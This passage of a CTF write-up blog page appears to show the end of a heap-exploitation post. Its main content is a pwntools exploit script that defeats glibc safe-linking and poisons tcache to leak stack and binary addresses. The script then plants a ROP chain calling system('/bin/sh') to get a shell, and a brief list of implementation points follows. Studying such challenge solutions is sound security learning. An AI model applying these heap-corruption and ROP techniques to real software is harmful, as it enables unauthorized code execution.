+</span></span><span class="line"><span class="cl"><span class="n">log</span><span class="o">.</span><span class="n">critical</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;environ: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">environ</span><span class="p">)</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">delete</span><span class="p">(</span><span class="n">chunk_D</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">p64</span><span class="p">((</span><span class="n">environ</span><span class="o">-</span><span class="mi">24</span><span class="p">)</span> <span class="o">^</span> <span class="p">((</span><span class="n">heap_base</span> <span class="o">+</span> <span class="mh">0x1000</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">12</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="n">write</span><span class="p">(</span><span class="n">chunk_D</span><span class="p">,</span><span class="sa">b</span><span class="s1">&#39;0&#39;</span><span class="p">,</span><span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">chunk_F</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x80</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">chunk_G</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x80</span><span class="p">)</span> <span class="c1"># &lt;--- our environ chunk</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;D3L3T357&#39;</span><span class="o">*</span><span class="mi">3</span>
+</span></span><span class="line"><span class="cl"><span class="n">write</span><span class="p">(</span><span class="n">chunk_G</span><span class="p">,</span><span class="sa">b</span><span class="s1">&#39;0&#39;</span><span class="p">,</span><span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">read</span><span class="p">(</span><span class="n">chunk_G</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">recvn</span><span class="p">(</span><span class="mh">0x19</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">leak_stack</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="n">recvn</span><span class="p">(</span><span class="mi">8</span><span class="p">)[</span><span class="mi">2</span><span class="p">:]</span>
+</span></span><span class="line"><span class="cl"><span class="n">leak_stack</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">leak_stack</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span><span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;leak stack: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">leak_stack</span><span class="p">)</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">rbp_addr</span> <span class="o">=</span> <span class="n">leak_stack</span> <span class="o">-</span> <span class="mh">0x138</span>
+</span></span><span class="line"><span class="cl"><span class="n">log</span><span class="o">.</span><span class="n">critical</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;rbp addr: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">rbp_addr</span><span class="p">)</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># =+=+--+=+= ELF LEAK +=+=+--+=+=</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;write 15&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;0&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;0x&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">leak_elf</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">12</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">leak_elf</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">leak_elf</span><span class="p">,</span><span class="mi">16</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;leak elf: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">leak_elf</span><span class="p">)</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">elf</span><span class="o">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">leak_elf</span> <span class="o">-</span> <span class="mh">0x4150</span>
+</span></span><span class="line"><span class="cl"><span class="n">log</span><span class="o">.</span><span class="n">critical</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;elf base: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">address</span><span class="p">)</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># =+=+--+=+= ROP CHAIN ON STACK +=+=+--+=+=</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">chunk_H</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x30</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">chunk_I</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x30</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">delete</span><span class="p">(</span><span class="n">chunk_H</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">delete</span><span class="p">(</span><span class="n">chunk_I</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">p64</span><span class="p">((</span><span class="n">rbp_addr</span><span class="p">)</span> <span class="o">^</span> <span class="p">((</span><span class="n">heap_base</span> <span class="o">+</span> <span class="mh">0x1000</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">12</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="n">write</span><span class="p">(</span><span class="n">chunk_I</span><span class="p">,</span><span class="sa">b</span><span class="s1">&#39;0&#39;</span><span class="p">,</span><span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">chunk_J</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x30</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">chunk_K</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x30</span><span class="p">)</span> <span class="c1"># &lt;--- our stack chunk</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">bin_sh</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">address</span><span class="o">+</span><span class="mh">0x1d84ab</span>
+</span></span><span class="line"><span class="cl"><span class="n">pop_rdi</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">address</span><span class="o">+</span><span class="mh">0x119e9c</span>
+</span></span><span class="line"><span class="cl"><span class="n">system</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">address</span><span class="o">+</span><span class="mh">0x5c110</span>
+</span></span><span class="line"><span class="cl"><span class="n">pop_rdi_pop_rbp</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">address</span><span class="o">+</span><span class="mh">0x2aa6b</span>
+</span></span><span class="line"><span class="cl"><span class="n">ret</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">address</span><span class="o">+</span><span class="mh">0x0000000000028882</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">bin_sh</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">ret</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">system</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">write</span><span class="p">(</span><span class="n">chunk_K</span><span class="p">,</span><span class="sa">b</span><span class="s1">&#39;0&#39;</span><span class="p">,</span><span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># =+=+--+=+= CLEARING PTR_TABLE AND SIZE_TABLE +=+=+--+=+=</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">chunk_L</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x200</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">chunk_M</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x200</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">chunk_N</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x100</span><span class="p">)</span> <span class="c1"># guard chunk</span>
+</span></span><span class="line"><span class="cl"><span class="n">delete</span><span class="p">(</span><span class="n">chunk_L</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">delete</span><span class="p">(</span><span class="n">chunk_M</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">ptr_table</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">address</span> <span class="o">+</span> <span class="mh">0x4060</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">p64</span><span class="p">((</span><span class="n">ptr_table</span><span class="p">)</span> <span class="o">^</span> <span class="p">((</span><span class="n">heap_base</span> <span class="o">+</span> <span class="mh">0x1000</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">12</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">write</span><span class="p">(</span><span class="n">chunk_M</span><span class="p">,</span><span class="sa">b</span><span class="s1">&#39;0&#39;</span><span class="p">,</span><span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">chunk_N</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x200</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">chunk_O</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x200</span><span class="p">)</span> <span class="c1"># &lt;--- our ptr_table chunk</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mi">32</span>
+</span></span><span class="line"><span class="cl"><span class="n">write</span><span class="p">(</span><span class="n">chunk_O</span><span class="p">,</span><span class="sa">b</span><span class="s1">&#39;0&#39;</span><span class="p">,</span><span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">gdb</span><span class="o">.</span><span class="n">attach</span><span class="p">(</span><span class="n">p</span><span class="p">,</span><span class="n">gs</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</span></span></code></pre></div>
+
+<h3 class="relative group">Key Implementation Details 
+    <div id="key-implementation-details" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#key-implementation-details" aria-label="Anchor">#</a>
+    </span>        
+    
+</h3>
+<ol>
+<li><strong>Error Handling</strong>: Robust interaction with process</li>
+<li><strong>Address Calculation</strong>: Precise offset calculations</li>
+<li><strong>Safe Linking Bypass</strong>: Proper XOR key computation</li>
+<li><strong>Memory Management</strong>: Clean allocation/deallocation</li>
+<li><strong>ROP Construction</strong>: Stack-aligned chain building</li>
+</ol>
+<hr>
+
+          
+          
+          
+        </div>
+        
+        
+
+        
+        
+
+        
+
+
+<h2 class="mt-8 text-2xl font-extrabold mb-10">Related</h2>
+<section class="w-full grid gap-4 sm:grid-cols-2 md:grid-cols-3">
+  
+  
+
+  <a href="/posts/vault3/" class="min-w-full">
+    
+    <div class="min-h-full border border-neutral-200 dark:border-neutral-700 border-2 rounded overflow-hidden shadow-2xl relative">
+        
+        <div class="w-full thumbnail_card_related nozoom" style="background-image:url(/posts/vault3/featured_hu7cbeff8289d989b3e12248214b81330a_10164_600x0_resize_box_3.png);"></div>
+        
+      
+
+      <div class="px-6 py-4">
+
+        
+        <div class="font-bold text-xl text-neutral-800 decoration-primary-500 hover:underline hover:underline-offset-2 dark:text-neutral"
+          href="/posts/vault3/">ScriptCTF - Vault3 Challenge Writeup</div>
+        
+
+        <div class="text-sm text-neutral-500 dark:text-neutral-400">
+          
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+<div class="flex flex-row flex-wrap items-center">
+  
+  
+  <time datetime="2025-08-18T00:00:00&#43;00:00">2025-08-18</time><span class="px-2 text-primary-500">&middot;</span><span>2351 words</span><span class="px-2 text-primary-500">&middot;</span><span title="Reading time">12 mins</span>
+  
+
+  
+  
+</div>
+
+
+<div class="flex flex-row flex-wrap items-center">
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+</div>
+
+
+
+
+<div class="flex flex-row flex-wrap items-center">
+  
+  
+  
+  
+  
+  
+  <span style="margin-top:0.5rem" class="mr-2" onclick="window.open(&#34;/categories/heap/&#34;,'_self');return false;">
+    <span class="flex" style="cursor: pointer;">
+  <span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
+    Heap
+  </span>
+</span>
+  </span>
+  
+  <span style="margin-top:0.5rem" class="mr-2" onclick="window.open(&#34;/categories/safe-unlink/&#34;,'_self');return false;">
+    <span class="flex" style="cursor: pointer;">
+  <span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
+    Safe Unlink
+  </span>
+</span>
+  </span>
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  <span style="margin-top:0.5rem" class="mr-2" onclick="window.open(&#34;/tags/ctf/&#34;,'_self');return false;">
+    <span class="flex" style="cursor: pointer;">
+  <span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
+    Ctf
+  </span>
+</span>
+  </span>
+  
+  <span style="margin-top:0.5rem" class="mr-2" onclick="window.open(&#34;/tags/writeup/&#34;,'_self');return false;">
+    <span class="flex" style="cursor: pointer;">
+  <span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
+    Writeup
+  </span>
+</span>
+  </span>
+  
+  <span style="margin-top:0.5rem" class="mr-2" onclick="window.open(&#34;/tags/pwn/&#34;,'_self');return false;">
+    <span class="flex" style="cursor: pointer;">
+  <span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
+    Pwn
+  </span>
+</span>
+  </span>
+  
+  <span style="margin-top:0.5rem" class="mr-2" onclick="window.open(&#34;/tags/heap/&#34;,'_self');return false;">
+    <span class="flex" style="cursor: pointer;">
+  <span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
+    Heap
+  </span>
+</span>
+  </span>
+  
+  
+  
+  
+</div>
+
+
+
+
+        </div>
+
+        
+      </div>
+      <div class="px-6 pt-4 pb-2">
+
+      </div>
+    </div>
+  </a>
+
+  
+  
+
+  <a href="/posts/smiley_babyrop/" class="min-w-full">
+    
+    <div class="min-h-full border border-neutral-200 dark:border-neutral-700 border-2 rounded overflow-hidden shadow-2xl relative">
+        
+        <div class="w-full thumbnail_card_related nozoom" style="background-image:url(/posts/smiley_babyrop/featured_hub1a36e8f98c986c5faf5443988a808b5_2663_600x0_resize_box_3.png);"></div>
+        
+      
+
+      <div class="px-6 py-4">
+
+        
+        <div class="font-bold text-xl text-neutral-800 decoration-primary-500 hover:underline hover:underline-offset-2 dark:text-neutral"
+          href="/posts/smiley_babyrop/">Smiley CTF - `babyrop` Challenge Writeup</div>
+        
+
+        <div class="text-sm text-neutral-500 dark:text-neutral-400">
+          
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+<div class="flex flex-row flex-wrap items-center">
+  
+  
+  <time datetime="2025-06-16T00:00:00&#43;00:00">2025-06-16</time><span class="px-2 text-primary-500">&middot;</span><span>1665 words</span><span class="px-2 text-primary-500">&middot;</span><span title="Reading time">8 mins</span>
+  
+
+  
+  
+</div>
+
+
+<div class="flex flex-row flex-wrap items-center">
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+</div>
+
+
+
+
+<div class="flex flex-row flex-wrap items-center">
+  
+  
+  
+  
+  
+  
+  <span style="margin-top:0.5rem" class="mr-2" onclick="window.open(&#34;/categories/rop/&#34;,'_self');return false;">
+    <span class="flex" style="cursor: pointer;">
+  <span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
+    Rop
+  </span>
+</span>
+  </span>
+  
+  <span style="margin-top:0.5rem" class="mr-2" onclick="window.open(&#34;/categories/stack-pivot/&#34;,'_self');return false;">
+    <span class="flex" style="cursor: pointer;">
+  <span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
+    Stack Pivot
+  </span>
+</span>
+  </span>
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  <span style="margin-top:0.5rem" class="mr-2" onclick="window.open(&#34;/tags/ctf/&#34;,'_self');return false;">
+    <span class="flex" style="cursor: pointer;">
+  <span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
+    Ctf
+  </span>
+</span>
+  </span>
+  
+  <span style="margin-top:0.5rem" class="mr-2" onclick="window.open(&#34;/tags/writeup/&#34;,'_self');return false;">
+    <span class="flex" style="cursor: pointer;">
+  <span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
+    Writeup
+  </span>
+</span>
+  </span>
+  
+  
+  
+  
+</div>
+
+
+
+
+        </div>
+
+        
+      </div>
+      <div class="px-6 pt-4 pb-2">
+
+      </div>
+    </div>
+  </a>
+
+  
+  
+
+  <a href="/posts/git_immersion/" class="min-w-full">
+    
+    <div class="min-h-full border border-neutral-200 dark:border-neutral-700 border-2 rounded overflow-hidden shadow-2xl relative">
+        
+        <div class="w-full thumbnail_card_related nozoom" style="background-image:url(/posts/git_immersion/featured_hu6a24a3110c6bcac41ad2025420107fd4_29573_600x0_resize_box_3.png);"></div>
+        
+      
+
+      <div class="px-6 py-4">
+
+        
+        <div class="font-bold text-xl text-neutral-800 decoration-primary-500 hover:underline hover:underline-offset-2 dark:text-neutral"
+          href="/posts/git_immersion/">Git Immersion: A Deep Dive into Version Control</div>
+        
+
+        <div class="text-sm text-neutral-500 dark:text-neutral-400">
+          
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+<div class="flex flex-row flex-wrap items-center">
+  
+  
+  <time datetime="2025-06-03T00:00:00&#43;00:00">2025-06-03</time><span class="px-2 text-primary-500">&middot;</span><span>4973 words</span><span class="px-2 text-primary-500">&middot;</span><span title="Reading time">24 mins</span>
+  
+
+  
+  
+</div>
+
+
+<div class="flex flex-row flex-wrap items-center">
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+</div>
+
+
+
+
+<div class="flex flex-row flex-wrap items-center">
+  
+  
+  
+  
+  
+  
+  <span style="margin-top:0.5rem" class="mr-2" onclick="window.open(&#34;/categories/version-control/&#34;,'_self');return false;">
+    <span class="flex" style="cursor: pointer;">
+  <span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
+    Version Control
+  </span>
+</span>
+  </span>
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  <span style="margin-top:0.5rem" class="mr-2" onclick="window.open(&#34;/tags/git/&#34;,'_self');return false;">
+    <span class="flex" style="cursor: pointer;">
+  <span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
+    Git
+  </span>
+</span>
+  </span>
+  
+  <span style="margin-top:0.5rem" class="mr-2" onclick="window.open(&#34;/tags/version-control/&#34;,'_self');return false;">
+    <span class="flex" style="cursor: pointer;">
+  <span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
+    Version Control
+  </span>
+</span>
+  </span>
+  
+  <span style="margin-top:0.5rem" class="mr-2" onclick="window.open(&#34;/tags/development/&#34;,'_self');return false;">
+    <span class="flex" style="cursor: pointer;">
+  <span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
+    Development
+  </span>
+</span>
+  </span>
+  
+  
+  
+  
+</div>
+
+
+
+
+        </div>
+
+        
+      </div>
+      <div class="px-6 pt-4 pb-2">
+
+      </div>
+    </div>
+  </a>
+
+  
+</section>
+
+  
+      </div>
+     
+      
+      
+        
+        
+          
+          
+        
+      <script>
+        var oid = "views_posts\/heapx\/index.md"
+        var oid_likes = "likes_posts\/heapx\/index.md"
+      </script>
+      
+      
+      <script type="text/javascript" src="/js/page.min.b06a29d42a4ed16787978e2eee1e8c797b7698db2bc14ccee78f5c80ac566fc996190a73ad80a5e987558474b20b96fa38f7d85b405f165ff72b7b163c5ad11b.js" integrity="sha512-sGop1CpO0WeHl44u7h6MeXt2mNsrwUzO549cgKxWb8mWGQpzrYCl6YdVhHSyC5b6OPfYW0BfFl/3K3sWPFrRGw=="></script>
+      
+  
+    </section>
+  <footer class="pt-8 max-w-prose print:hidden">
+
+    
+  
+    
+    
+    
+    <div class="pt-8">
+      <hr class="border-dotted border-neutral-300 dark:border-neutral-600" />
+      <div class="flex justify-between pt-3">
+        <span>
+          
+            <a class="flex group mr-3" href="/posts/vault3/">
+              <span
+                class="mr-3 text-neutral-700 group-hover:text-primary-600 ltr:inline rtl:hidden dark:text-neutral dark:group-hover:text-primary-400"
+                >&larr;</span
+              >
+              <span
+                class="ml-3 text-neutral-700 group-hover:text-primary-600 ltr:hidden rtl:inline dark:text-neutral dark:group-hover:text-primary-400"
+                >&rarr;</span
+              >
+              <span class="flex flex-col">
+                <span
+                  class="mt-[0.1rem] leading-6 group-hover:underline group-hover:decoration-primary-500"
+                  >ScriptCTF - Vault3 Challenge Writeup</span
+                >
+                <span class="mt-[0.1rem] text-xs text-neutral-500 dark:text-neutral-400">
+                  
+                    <time datetime="2025-08-18T00:00:00&#43;00:00">2025-08-18</time>
+                  
+                </span>
+              </span>
+            </a>
+          
+        </span>
+        <span>
+          
+        </span>
+      </div>
+    </div>
+  
+
+
+    
+  </footer>
+</article>
+
+      <div id="top-scroller" class="pointer-events-none absolute top-[110vh] bottom-0 w-12 ltr:right-0 rtl:left-0">
+  <a href="#the-top"
+    class="pointer-events-auto sticky top-[calc(100vh-5.5rem)] flex h-12 w-12 mb-16 items-center justify-center rounded-full bg-neutral/50 text-xl text-neutral-700 hover:text-primary-600 dark:bg-neutral-800/50 dark:text-neutral dark:hover:text-primary-400"
+    aria-label="Scroll to top" title="Scroll to top">
+    &uarr;
+  </a>
+</div>
+    </main><footer id="site-footer" class="py-10 print:hidden">
+  
+  
+    
+    <nav class="flex flex-row pb-4 text-base font-medium text-neutral-500 dark:text-neutral-400">
+      <ul class="flex flex-col list-none sm:flex-row">
+        
+        <li class="flex mb-1 ltr:text-right rtl:text-left sm:mb-0 ltr:sm:mr-7 ltr:sm:last:mr-0 rtl:sm:ml-7 rtl:sm:last:ml-0">
+          <a class="decoration-primary-500 hover:underline hover:decoration-2 hover:underline-offset-2 flex items-center" href="/posts/"
+            title="">
+            
+            Blog
+          </a>
+        </li>
+        
+        <li class="flex mb-1 ltr:text-right rtl:text-left sm:mb-0 ltr:sm:mr-7 ltr:sm:last:mr-0 rtl:sm:ml-7 rtl:sm:last:ml-0">
+          <a class="decoration-primary-500 hover:underline hover:decoration-2 hover:underline-offset-2 flex items-center" href="/categories/"
+            title="">
+            
+            Categories
+          </a>
+        </li>
+        
+        <li class="flex mb-1 ltr:text-right rtl:text-left sm:mb-0 ltr:sm:mr-7 ltr:sm:last:mr-0 rtl:sm:ml-7 rtl:sm:last:ml-0">
+          <a class="decoration-primary-500 hover:underline hover:decoration-2 hover:underline-offset-2 flex items-center" href="/tags/"
+            title="">
+            
+            Tags
+          </a>
+        </li>
+        
+      </ul>
+    </nav>
+    
+  
+  <div class="flex items-center justify-between">
+
+    
+    
+    <p class="text-sm text-neutral-500 dark:text-neutral-400">
+      D3LET3 was here!
+    </p>
+    
+
+    
+    
+
+  </div>
+  <script>
+    
+    mediumZoom(document.querySelectorAll("img:not(.nozoom)"), {
+      margin: 24,
+      background: 'rgba(0,0,0,0.5)',
+      scrollOffset: 0,
+    })
+    
+  </script>
+  
+  
+  <script type="text/javascript" src="/js/process.min.62060bb247f4de2b6dde45903668fefb68d792f365587605177b1227c0cf43588701edaca0cb40e2c8e2789bd5ce67c1d2a215b9fb258c3496a7cd25e7cb5fdf.js" integrity="sha512-YgYLskf03itt3kWQNmj&#43;&#43;2jXkvNlWHYFF3sSJ8DPQ1iHAe2soMtA4sjieJvVzmfB0qIVufsljDSWp80l58tf3w=="></script>
+  
+  
+</footer>
+<div
+  id="search-wrapper"
+  class="invisible fixed inset-0 flex h-screen w-screen cursor-default flex-col bg-neutral-500/50 p-4 backdrop-blur-sm dark:bg-neutral-900/50 sm:p-6 md:p-[10vh] lg:p-[12vh]"
+  data-url="//localhost:1313/"
+  style="z-index:500"
+>
+  <div
+    id="search-modal"
+    class="flex flex-col w-full max-w-3xl min-h-0 mx-auto border rounded-md shadow-lg top-20 border-neutral-200 bg-neutral dark:border-neutral-700 dark:bg-neutral-800"
+  >
+    <header class="relative z-10 flex items-center justify-between flex-none px-2">
+      <form class="flex items-center flex-auto min-w-0">
+        <div class="flex items-center justify-center w-8 h-8 text-neutral-400">
+          
+
+  <span class="relative block icon">
+    <svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>
+
+  </span>
+
+
+        </div>
+        <input
+          type="search"
+          id="search-query"
+          class="flex flex-auto h-12 mx-1 bg-transparent appearance-none focus:outline-dotted focus:outline-2 focus:outline-transparent"
+          placeholder="Search"
+          tabindex="0"
+        />
+      </form>
+      <button
+        id="close-search-button"
+        class="flex items-center justify-center w-8 h-8 text-neutral-700 hover:text-primary-600 dark:text-neutral dark:hover:text-primary-400"
+        title="Close (Esc)"
+      >
+        
+
+  <span class="relative block icon">
